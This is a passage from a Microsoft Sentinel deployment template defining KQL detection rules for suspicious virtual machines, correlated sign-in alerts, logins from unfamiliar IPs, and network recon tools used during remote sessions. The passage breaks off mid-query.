            "alertDescriptionFormat": "This detection identifies the use of suspicious virtual machines, including previously unobserved ones, consistent with known adversary tactics that leverage VMs as an evasion technique to avoid security controls and monitoring.\n\n{{ExtendedDescription}}\n\ntag: RBA\nCategory: Microsoft Defender XDR\nMITRE: T1564 MITRE: T1578 MITRE: T1610 MITRE: T1497 MITRE: T1553 MITRE: T1584"
          },
          "customDetails": {
            "bv_dedup_hash": "bv_dedup_hash",
            "VictimEntity": "bv_alarm_victim_entities",
            "AttackerEntity": "bv_alarm_attacker_entities",
            "RBAScore": "bv_alarm_rba_score",
            "bvtag": "bv_mapping_tag"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "bv_user"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "bv_src_dvc1"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "bv_dest_dvc"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-999998')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-999998')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-999998: [Expedite] Delegated Notifications",
          "description": "Any RBA Rule IDs listed in BV999998_DELEGATED_ALERTS will be transformed into an Incident that can then be used for investigation and notification by the client MITRE:  Category: SecurityAlert tag: Expedite",
          "severity": "Informational",
          "enabled": true,
          "query": "let start_time = 7m;\nlet latency = 30m;\nlet end_time = now();\nlet start_time_historical=1h;\n//let PreviousSecurityIncidents = \n//toscalar(SecurityIncident\n//| where TimeGenerated between (ago(start_time_historical) .. end_time)\n//| where Title contains 'BV-'\n//| parse Title with RuleID ':' *\n//| where RuleID in (BV999999_DELEGATED_ALERTS)\n//| summarize make_set(AlertIds));\nlet PreviousAlertIds = toscalar(\n  SecurityAlert\n  //| where SystemAlertId in (PreviousSecurityIncidents)\n  | extend OriginalAlertID = tostring(parse_json(tostring(parse_json(tostring(parse_json(ExtendedProperties).[\"Custom Details\"])).DelegatedAlertID))[0])\n  | summarize make_set(OriginalAlertID)\n);\nSecurityAlert\n| where TimeGenerated between (ago(start_time + latency) .. end_time)\n| where AlertName contains 'BV-'\n| parse AlertName with RuleID ':' *\n| where AlertName !contains 'Expedite'\n| where Description !contains '[Delegated Notification]'\n| extend signature = trim(@'\\s', extract(@'(?m)bv_signature:(.*)$', 1, Description))\n|where RuleID in (BV999998_DELEGATED_ALERTS) or strcat(RuleID,'|', signature) in~ (BV999998_DELEGATED_ALERTS)\n  or RuleID in (BV999998_DELEGATED_ALERTS_P)\n| where SystemAlertId !in (PreviousAlertIds)\n| parse AlertName with * ']' Title\n| mv-apply e=todynamic(Entities) on ( \n    extend ip = iff(e.Type == 'ip', e.Address, '')\n    | extend account = iff(e.Type == 'account', e.Name, '')\n    | extend url = iff(e.Type == 'url', e.Url, '')\n    | summarize \n        ip = make_set_if(ip, isnotempty(ip))\n        , account = make_set_if(account, isnotempty(account))\n        , url = make_set_if(url, isnotempty(url))\n)\n| extend bv_rule_version = '1.0.4610'\n| extend bv_rule_timestamp = '1702489410.0303438'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.0.4610 bv_rule_timestamp: 1702489410.0303438'\n| project\n    Title\n    , RuleID\n    , Description\n    , ip1 = ip[0]\n    , account1 = account[0]\n    , url1 = url[0]\n    , AlertSeverity\n    , Tactics\n    , SystemAlertId\n    , bv_rule_combined_string",
          "queryFrequency": "PT7M",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "{{RuleID}}: [Expedite] {{Title}}",
            "alertDescriptionFormat": "[Delegated Notification]\n\n{{Description}}\n{{bv_rule_combined_string}}",
            "alertTacticsColumnName": "Tactics",
            "alertSeverityColumnName": "AlertSeverity"
          },
          "customDetails": {
            "DelegatedAlertID": "SystemAlertId"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "account1"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "ip1"
                }
              ]
            },
            {
              "entityType": "URL",
              "fieldMappings": [
                {
                  "identifier": "Url",
                  "columnName": "url1"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/5c2e5023-619a-4ff2-832f-b0793fceb917')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/5c2e5023-619a-4ff2-832f-b0793fceb917')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Correlate Unfamiliar sign-in properties & atypical travel alerts",
          "description": "The combination of an Unfamiliar sign-in properties alert and an Atypical travel alert about the same user within a +10m or -10m window is considered a high severity incident.",
          "severity": "High",
          "enabled": true,
          "query": "// We can use this configuration TimeDeltaInMinutes if you want to chnage the time window that we try to match the alerts\nlet TimeDeltaInMinutes = 10;\nlet Alert_UnfamiliarSignInProps = \nSecurityAlert\n| where TimeGenerated > ago(1d)\n| where ProductName =~ \"Azure Active Directory Identity Protection\"\n| where AlertName =~ \"Unfamiliar sign-in properties\"\n| mv-expand Entity = todynamic(Entities)\n| where Entity.Type =~ \"account\"\n| extend AadTenantId = tostring(Entity.AadTenantId)\n| extend AadUserId = tostring(Entity.AadUserId)\n| join kind=inner (\nIdentityInfo\n| distinct AccountTenantId, AccountObjectId, AccountUPN, AccountDisplayName\n| extend UserName = AccountDisplayName\n| extend UserAccount = AccountUPN\n| where isnotempty(AccountDisplayName) and isnotempty(UserAccount)\n| project AccountTenantId, AccountObjectId, UserAccount, UserName\n)\non\n$left.AadTenantId == $right.AccountTenantId,\n$left.AadUserId == $right.AccountObjectId\n| extend CompromisedEntity = iff(CompromisedEntity == \"N/A\" or isempty(CompromisedEntity), UserAccount, CompromisedEntity)\n| extend Alert_UnfamiliarSignInProps_Time = TimeGenerated\n| extend Alert_UnfamiliarSignInProps_Name = AlertName\n| extend Alert_UnfamiliarSignInProps_Severity = AlertSeverity\n| project AadTenantId, AadUserId, AccountTenantId, AccountObjectId, Alert_UnfamiliarSignInProps_Name, Alert_UnfamiliarSignInProps_Severity, Alert_UnfamiliarSignInProps_Time, UserAccount, UserName\n;\nlet Alert_AtypicalTravels = \nSecurityAlert\n| where TimeGenerated > ago(1d)\n| where ProductName =~ \"Azure Active Directory Identity Protection\"\n| where AlertName =~ \"Atypical travel\"\n| mv-expand Entity = todynamic(Entities)\n| where Entity.Type =~ \"account\"\n| extend AadTenantId = tostring(Entity.AadTenantId)\n| extend AadUserId = tostring(Entity.AadUserId)\n| join kind=inner (\nIdentityInfo\n| distinct AccountTenantId, AccountObjectId, AccountUPN, AccountDisplayName\n| extend UserName = AccountDisplayName\n| extend UserAccount = AccountUPN\n| where isnotempty(AccountDisplayName) and isnotempty(UserAccount)\n| project AccountTenantId, AccountObjectId, UserAccount, UserName\n)\non\n$left.AadTenantId == $right.AccountTenantId,\n$left.AadUserId == $right.AccountObjectId\n| extend CompromisedEntity = iff(CompromisedEntity == \"N/A\" or isempty(CompromisedEntity), UserAccount, CompromisedEntity)\n| extend Alert_AtypicalTravels_Time = TimeGenerated\n| extend Alert_AtypicalTravels_Name = AlertName\n| extend Alert_AtypicalTravels_Severity = AlertSeverity\n| extend ExtendedProperties_json= parse_json(ExtendedProperties)\n| extend CurrentLocation = tostring(ExtendedProperties_json.[\"Current Location\"])\n| extend PreviousLocation = tostring(ExtendedProperties_json.[\"Previous Location\"])\n| extend CurrentIPAddress = tostring(ExtendedProperties_json.[\"Current IP Address\"])\n| extend PreviousIPAddress = tostring(ExtendedProperties_json.[\"Previous IP Address\"])\n| project AadTenantId, AadUserId, AccountTenantId, AccountObjectId, Alert_AtypicalTravels_Name, Alert_AtypicalTravels_Severity, Alert_AtypicalTravels_Time, CurrentIPAddress, PreviousIPAddress, CurrentLocation, PreviousLocation, UserAccount, UserName, CompromisedEntity\n;\nAlert_UnfamiliarSignInProps\n| join kind=inner Alert_AtypicalTravels on UserAccount\n| where abs(datetime_diff('minute', Alert_UnfamiliarSignInProps_Time, Alert_AtypicalTravels_Time)) <= TimeDeltaInMinutes\n| extend TimeDelta = Alert_UnfamiliarSignInProps_Time - Alert_AtypicalTravels_Time\n| project UserAccount, AadUserId, Alert_UnfamiliarSignInProps_Name, Alert_UnfamiliarSignInProps_Severity, Alert_UnfamiliarSignInProps_Time, Alert_AtypicalTravels_Name, Alert_AtypicalTravels_Severity, Alert_AtypicalTravels_Time, TimeDelta, CurrentLocation, PreviousLocation, CurrentIPAddress, PreviousIPAddress, UserName\n| extend UserEmailName = split(UserAccount,'@')[0], UPNSuffix = split(UserAccount,'@')[1]\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess"
          ],
          "techniques": [
            "T1078"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "a3df4a32-4805-4c6d-8699-f3c888af2f67",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": {
            "PreviousIPAddress": "PreviousIPAddress",
            "PreviousLocation": "PreviousLocation",
            "Alert1_Severity": "Alert_UnfamiliarSignInProps_Severity",
            "Alert2_Severity": "Alert_AtypicalTravels_Severity",
            "Alert1_Name": "Alert_UnfamiliarSignInProps_Name",
            "Alert2_Name": "Alert_AtypicalTravels_Name",
            "CurrentIPAddress": "CurrentIPAddress",
            "CurrentLocation": "CurrentLocation",
            "Alert2_Time": "Alert_AtypicalTravels_Time",
            "TimeDelta": "TimeDelta",
            "Alert1_Time": "Alert_UnfamiliarSignInProps_Time"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "UserAccount"
                },
                {
                  "identifier": "Name",
                  "columnName": "UserEmailName"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "UPNSuffix"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "AadUserId",
                  "columnName": "AadUserId"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "CurrentIPAddress"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "PreviousIPAddress"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.8"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-20500')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-20500')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-20500: [RBA] Auth - Login from an unfamiliar IP not reported last 14 days",
          "description": "Alerts on successful login activity, flagging unrecognized /16 subnet IP addresses not reported in the past 14 days. It specifically excludes IPs associated with Zscaler and Cato SD WAN\n\ncim_models: auth, network MITRE: T1078 Category: Azure Application Gateway,AzureFirewall,AzureMonitor(IIS),BVIM,Cisco ASA,Cisco ISE,Cisco Router Syslog Cribl,Entra ID,IBM iSeries,Linux,Linux Firewall,Microsoft Default Alert Table,Microsoft Defender XDR,Microsoft DHCP,Mimecast by BlueVoyant,MongoDB Audit,MSSQL,OktaSSO,Palo Alto GlobalProtect,Palo Alto Networks,Ping Federation,ProofpointTRAP,RSA SecureID,Security Onion,Sophos Firewall,VMware ESXi,VMware vCenter,Windows DHCP tag: RBA",
          "severity": "Low",
          "enabled": true,
          "query": "let start_time = 1h;\nlet alert_id = 'BV-20500';\nlet alert_type = 'RBA';\nlet start_time_historical = 1d;\nlet end_time = now();\nlet alert_bin = 1h;\nlet start_time_suppress = 14d;\nlet exclude_hash = false;\nlet calculate_hash = false;\nlet max_description_line = 300;\nlet max_description_list_length = 5;\nlet global_config = dynamic({'EXCLUDED_USER_REGEX': @'EXCLUDED_USER_REGEX'});\nlet excluded_dedup_fields = array_concat(bv_excluded_dedup_hash_fields, global_config['excluded_dedup_hash_fields']);\nlet excluded_description_fields = dynamic(['bv_user_normalized']);\nlet excluded_user = strcat(global_config['EXCLUDED_USER_REGEX'], \n          iff(isnotempty(BV20500_CONFIG.EXCLUDED_USER_REGEX),strcat('| ', BV20500_CONFIG.EXCLUDED_USER_REGEX),'')); \nlet exclusions = array_concat(global_config['EXCLUSION'], BV20500_CONFIG['EXCLUSIONS'], dynamic([{}]));\nlet rba_score = coalesce(toreal(global_config['RBASCORE']), toreal(BV20500_CONFIG['RBASCORE']),1.0);\nlet excluded_ips = array_concat(global_config['EXCLUDED_IP_LIST'], BV20500_CONFIG['EXCLUDED_IP_LIST'], BV_CLIENT_IP_RANGES, dynamic([]));\nlet gen_detail_and_hash = (t: (*), ef:dynamic=dynamic([]), mfl:int=300, mal:int=5, efd:dynamic=dynamic([]), dh:boolean=true){\n        t\n        | extend a = pack_all()\n        | extend k = array_sort_asc(bag_keys(a))\n        | mv-apply k to typeof(string) on (\n            extend v = todynamic(tostring(a[k]))\n            | extend v = iff(gettype(v) != 'array', pack_array(v), v)\n            | extend \n                vl = iff(array_length(v) == 1 and isempty(v[0]),0,array_length(v))\n                , vf = k startswith 'bv_' and not (k has_any (efd))\n            | extend vv = vl == 1 \n            | extend \n                df = iff(vf and vv, k, '')\n                , dv = iff(vf and vv, v[0], '')\n            | extend e = iff(k startswith 'bv_' and k != 'bv_raw' and not(k has_any (ef)), strcat(\n                case(vl > 1 , strcat(k, ': \\n* ', substring(strcat_array(array_slice(v,0,(mal-1)),'\\n* '),0,mfl), '\\n')\n                , vl == 1, strcat(k,': ', v[0])\n                , '')\n                ),'')\n                | summarize \n                    e = make_set(e)\n                    , bv_dedup_fields = make_set_if(df, isnotempty(df))\n                    , bv_dedup_values = make_set_if(dv, isnotempty(dv))\n        )\n        | extend \n            ExtendedDescription=strcat_array(e, '\\n ')\n            , bv_dedup_hash = columnifexists('bv_dedup_hash', '')\n        | extend bv_dedup_hash = iff(dh,hash_sha1(strcat_array(bv_dedup_values,'')),bv_dedup_hash)\n  };\n        let match = (table_parameter: (*), items:dynamic, match_type: string){\n          table_parameter\n          | extend all_data = pack_all()\n          | mv-apply e = items on (\n              extend keys = bag_keys(e)\n              | extend key_count = iff(keys contains 'metadata', array_length(keys) -1, array_length(keys))\n              | mv-apply k = keys to typeof(string) on (\n                  extend list = split(e[k],',')\n                  | mv-apply l = list to typeof(string) on (\n                      extend item = iff(gettype(todynamic(all_data[k])) != 'array', pack_array(all_data[k]), todynamic(all_data[k]))\n                      | mv-apply i = item to typeof(string) on (\n                          extend compare = i contains l or ipv6_is_match(tostring(all_data[k]),l)\n                          | summarize excluded_count = countif(compare)\n                          | extend item_excluded = excluded_count > 0\n                      )\n                      | summarize excluded_count = countif(item_excluded)\n                      | extend item_excluded = excluded_count > 0\n                  )\n                  | summarize excluded_list_item = countif(item_excluded > 0)\n              )\n              | extend matched =  key_count == excluded_list_item and key_count != 0\n              | extend visibility = iff(matched and isnotempty(e.metadata[\"visibility\"]), e.metadata[\"visibility\"], 2)\n              | extend bv_exclusion_reason = iff(matched, parse_json(e.metadata).reason, '')\n              | summarize matched=make_set(matched), visibility=make_set(visibility), bv_exclusion_reason = make_set_if(bv_exclusion_reason, isnotempty(bv_exclusion_reason))\n          )\n          | extend match_status = iff(matched contains \"true\", match_type, '')\n  };\n  let desc_gen = (T: (*), ttype:string){\n    T\n    | extend a = pack_all()\n    | extend t = tostring(a[ttype])\n    | extend t = replace('\\n', '@new_line@',t)\n    | extend ot = extract_all(@'(\\[.*?\\])',t)\n    | mv-apply o = ot on (\n        parse o with * '~' k'~' *\n        | extend v = todynamic(a[k])\n        | extend v = iff(gettype(v) !='array', pack_array(v), v)\n        | extend r = iff(isempty(v) or (array_length(v) == 1 and (isempty(v[0]) or v[0] == 0) or array_length(v)==0),'',o)\n        | extend r = trim_end(@'\\]',r)\n        | extend r = trim_start(@'\\[.*~',r)\n        | summarize otr =make_list(r)\n    )\n    | extend tr = replace_strings(t, ot, otr )\n    | extend sdk = extract_all(@'(<bv_[\\w_]*>)',tr)\n    | extend gk = extract_all(@'(<g_bv_[\\w_]*>)',tr)\n    | mv-apply g = gk on (\n        parse g with '<g_' key '_p' *\n        | parse g with * '_p_' verb '>'\n        | extend v = a[key]\n        | extend ip = (gettype(v) == 'array' and array_length(v) > 1) or toint(v)>1\n        | extend r = case (\n            isempty(verb) and not(ip), ''\n            , isempty(verb) and ip, 's'\n            , verb == 'was' and (not(ip) or isempty(ip)), 'was'\n            , verb == 'was' and ip, 'were'\n            , verb == 'this' and ip, 'these'\n            , verb == 'this' and not(ip), 'this'\n            , verb == 'is' and (not(ip) or isempty(ip)), 'is'\n            , verb == 'is' and ip, 'are'\n        ,''\n        )\n        | summarize gr = make_list(r)\n    )\n    | mv-apply k = sdk on (\n        parse k with '<' key '>'\n        | extend v = todynamic(tostring(a[key]))\n        | extend v = iff(gettype(v) != 'array', pack_array(v), v)\n        | extend vl = array_length(v)\n        | extend r = case(\n            vl == 1, v[0]\n            , vl == 2, strcat(v[0], ' and ', v[1])\n            ,vl  > 2, strcat(v[0], ', ', v[1], ', and ', vl-2, ' others')\n            ,'')\n    | summarize r = make_list(r))\n    | extend dr = replace_strings(tr, sdk, r)\n    | extend dr = replace_strings(dr, gk, gr)\n    | extend dr = replace('@new_line@', '\\n',dr)\n    | extend hd = coalesce(a['desc_gen'],dynamic({}))\n    | extend desc_gen = bag_set_key(hd, ttype, dr)\n  };\n  let rba_score_calculator = (table_parameter: (visibility:dynamic), RuleId_constant:string){\n    let global_override = toscalar(bv_rba_global_override | where Status == 'prod' | where RuleId == RuleId_constant | summarize arg_max(TimeGenerated, GlobalRBAMultiplier, GlobalOverrideRBA) by RuleId \n    | project bag_pack('GlobalRBAMultiplier',GlobalRBAMultiplier,'GlobalOverrideRBA',GlobalOverrideRBA));\n        let client_override = toscalar(BV_RBA_CLIENT_OVERRIDE | where Status == 'prod' | where RuleId == RuleId_constant | summarize arg_max(TimeGenerated, ClientRBAMultiplier, ClientOverrideRBA) by RuleId \n    | project bag_pack('ClientRBAMultiplier',ClientRBAMultiplier,'ClientOverrideRBA',ClientOverrideRBA));\n        table_parameter\n        | extend rba_multiplier = coalesce(toreal(client_override['ClientRBAMultiplier']),toreal(global_override['GlobalRBAMultiplier']), 1.0)\n        | extend rba_multiplier = iff(rba_multiplier < 0.1, 0.1, rba_multiplier)\n        | extend rba_multiplier = iff(rba_multiplier > 3, 3.0, rba_multiplier)\n        | extend rba_override = coalesce(toreal(client_override['ClientOverrideRBA']),toreal(global_override['GlobalOverrideRBA']), toreal(rba_score), 1.0)\n        | extend ModifiedRBAScore = toreal(rba_override) * rba_multiplier\n        | extend ModifiedRBAScore = case(\n          ModifiedRBAScore > 10, 10.0\n          , ModifiedRBAScore <0.1, 0.1\n          , ModifiedRBAScore\n        )\n        | extend bv_alarm_rba_score = iff(visibility contains '1', 0.0, ModifiedRBAScore)\n  };            \nbvim(starttime=ago(start_time), endtime=end_time, bv_tags_has='auth,network,user')\n| project bv_start_time, sourcetype, bv_authentication_action, bv_authentication_result, bv_user, bv_src_dvc_managed, bv_network_tags_trusted, bv_http_user_agent, bv_src_ip\n        , bv_src_asn, bv_src_country, bv_src_region, bv_src_city, bv_parser, bv_connector\n| where\n        sourcetype !~ 'AADNonInteractiveUserSignInLogs'\n        and bv_authentication_action == 'login'\n        and bv_authentication_result == 'success'\n        and bv_user != '' and bv_user matches regex tostring(excluded_user) == false\n        and bv_src_dvc_managed != true\n        and bv_network_tags_trusted != true\n        and bv_http_user_agent !~ 'Windows-AzureAD-Authentication-Provider/1.0'\n        and (ipv4_is_private(bv_src_ip) == false or isempty(ipv4_is_private(bv_src_ip)))\n        and (ipv4_is_in_any_range(bv_src_ip, dynamic(['127.0.0.0/8','169.254.0.0/16', '0.0.0.0', '::1'])) == false or ipv6_is_in_any_range(bv_src_ip, dynamic(['127.0.0.0/8','169.254.0.0/16', '0.0.0.0', '::1'])) == false)\n        and (ipv4_is_in_any_range(bv_src_ip,array_concat(excluded_ips, bv_zscaler_ip_range_dynamic, bv_cato_ip_range)) == false or ipv6_is_in_any_range(bv_src_ip,array_concat(excluded_ips, bv_zscaler_ip_range_dynamic, bv_cato_ip_range)) == false)\n| lookup bv_asn_lookup on bv_src_asn\n| extend ip_string = parse_ipv6(strcat(bv_src_ip, '/16'))\n| extend bv_dedup_hash = hash_sha1(ip_string)\n| where BV_FUN_DEDUP(alert_id, ago(start_time_suppress)) !has bv_dedup_hash\n| summarize hint.strategy=shuffle\n    bv_start_time = min(bv_start_time)\n    , bv_event_count = count()\n    , bv_end_time = max(bv_start_time)\n    , bv_user = make_set(tolower(bv_user))\n    , bv_src_ip = make_set(bv_src_ip)\n    , bv_src_country = make_set(bv_src_country)\n    , bv_src_region = make_set(bv_src_region)\n    , bv_src_city = make_set(bv_src_city)\n    , bv_src_asn = make_set(bv_src_asn)\n    , bv_src_org = make_set(bv_src_org)\n    by\n    ip_string\n    , bv_dedup_hash\n    , bv_start_time_bin = bin(bv_start_time,alert_bin)\n    , bv_connector\n    , sourcetype\n    , bv_parser\n| sort by bv_event_count asc\n| limit 150\n| extend bv_alarm_victim_entities = bv_user\n| extend bv_alarm_attacker_entities = bv_src_ip\n| extend\n    bv_user1 = bv_user[0]\n    , bv_user2 = bv_user[1]\n    , bv_user3 = bv_user[2]\n    , bv_src_ip1 = bv_src_ip[0]\n    , bv_src_ip2 = bv_src_ip[1]\n    , bv_src_ip3 = bv_src_ip[2]\n| extend bv_mapping_tag = bv_src_ip\n| extend bv_dedup_hash = hash_sha1(ip_string)\n| invoke match(exclusions, 'exclusion')\n| extend excluded = iff((alert_type in ('SOC','CUSTOM') and match_status == 'exclusion') or (alert_type == 'RBA' and visibility contains '0'), true, false)\n| where excluded == false\n| extend alert_id_temp = alert_id\n| lookup bv_desc_temp on alert_id_temp\n| invoke desc_gen('long_template')\n| invoke desc_gen('short_template')\n| invoke gen_detail_and_hash(excluded_description_fields, 300, 5,efd=excluded_dedup_fields,dh=calculate_hash)\n| where iff(exclude_hash, (BV_FUN_DEDUP(alert_id, start_time_suppress) !has bv_dedup_hash), true)\n| extend \n    bv_alarm_rba_score = BV_FUN_CALC_RBA(alert_id, visibility, rba_score)   \n    , bv_desc_l = strcat(desc_gen['long_template'],'\\n\\n',ExtendedDescription)\n    , bv_desc_s =desc_gen['short_template']\n//removes all events with a visibility of 0\n| where visibility !contains '0'\n| extend bv_rule_version = '1.17.5232'\n| extend bv_rule_timestamp = '1714395432.0639277'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.17.5232 bv_rule_timestamp: 1714395432.0639277'\n| project-keep\n    bv_*\n    , sourcetype",
          "queryFrequency": "PT1H",
          "queryPeriod": "P7D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess"
          ],
          "techniques": [
            "T1078"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "P1D",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-20500: [RBA] Auth - {{bv_connector}} - {{bv_desc_s}}",
            "alertDescriptionFormat": "{{bv_desc_l}}\n\ntag: RBA\nCategory: auth\nMITRE: T1078\n{{bv_rule_combined_string}}"
          },
          "customDetails": {
            "bv_dedup_hash": "bv_dedup_hash",
            "VictimEntity": "bv_alarm_victim_entities",
            "bvtag": "bv_mapping_tag",
            "AttackerEntity": "bv_alarm_attacker_entities",
            "RBAScore": "bv_alarm_rba_score"
          },
          "entityMappings": [
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "bv_src_ip1"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "bv_src_ip2"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "bv_src_ip3"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_user1"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_user2"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-11601')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-11601')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-11601: [SOC] Defender - Use Of Network Recon Tools During Remote Sessions",
          "description": "This detection identifies potential adversarial reconnaissance activity when network scanning tools (like Advanced IP Scanner) or Living-off-the-Land binaries (LOLBins) are executed in portable mode during an interactive remote session. Attackers frequently leverage these tools during lateral movement phases to identify and map network resources after gaining initial access via RDP or other remote management tools. This behavior pattern is strongly associated with ransomware operations and other targeted attacks. MITRE: T1046,T1087,T1016,T1018,T1021 Category: DefenderXDR/Microsoft Defender XDR tag: SOC",
          "severity": "Medium",
          "enabled": true,
          "query": "let alert_id = 'BV-11601';\nlet alert_type = 'SOC';\nlet exclude_hash = true;\nlet calculate_hash = false;\nlet max_description_line = 300;\nlet max_description_list_length = 5;\nlet end_time = now();\nlet start_time = 15m;\nlet start_time_suppress = 1d;\nlet global_config = dynamic({\n    'EXCLUSION': dynamic([{}])     \n});\nlet excluded_dedup_fields = array_concat(bv_excluded_dedup_hash_fields, global_config['excluded_dedup_hash_fields']);\nlet exclusions = array_concat(global_config['EXCLUSION'], BV11601_CONFIG['EXCLUSION'], dynamic([{}]));\nlet excluded_description_fields = dynamic(['bv_raw']);\nlet field_filter = array_concat(bv_global_field_filter, dynamic(['bv_src_ip']));\nlet rba_score = coalesce(toreal(global_config['RBASCORE']), toreal(BV11601_CONFIG['RBASCORE']),real(1.0));\nlet match = (table_parameter: (*), items:dynamic, match_type: string){\n        table_parameter\n        | extend all_data = pack_all()\n        | mv-apply e = items on (\n            extend keys = bag_keys(e)\n            | extend key_count = iff(keys contains 'metadata', array_length(keys) -1, array_length(keys))\n            | mv-apply k = keys to typeof(string) on (\n                extend list = split(e[k],',')\n                | mv-apply l = list to typeof(string) on (\n                    extend item = iff(gettype(todynamic(all_data[k])) != 'array', pack_array(all_data[k]), todynamic(all_data[k]))\n                    | mv-apply i = item to typeof(string) on (\n                        extend compare = i contains l or ipv6_is_match(tostring(all_data[k]),l)\n                        | summarize excluded_count = countif(compare)\n                        | extend item_excluded = excluded_count > 0\n                    )\n                    | summarize excluded_count = countif(item_excluded)\n                    | extend item_excluded = excluded_count > 0\n                )\n                | summarize excluded_list_item = countif(item_excluded > 0)\n            )\n            | extend matched =  key_count == excluded_list_item and key_count != 0\n            | extend visibility = iff(matched and isnotempty(e.metadata[\"visibility\"]), e.metadata[\"visibility\"], 2)\n            | extend bv_exclusion_reason = iff(matched, parse_json(e.metadata).reason, '')\n            | summarize matched=make_set(matched), visibility=make_set(visibility), bv_exclusion_reason = make_set_if(bv_exclusion_reason, isnotempty(bv_exclusion_reason))\n        )\n        | extend match_status = iff(matched contains \"true\", match_type, '')\n};\nlet description = (table_parameter: (*), excluded_fields:dynamic=dynamic(['']), max_field_length:int=300, max_array_length:int=5){\n    table_parameter\n    | extend all_data = pack_all()\n    | extend keys = bag_keys(all_data)\n    | mv-apply k = keys to 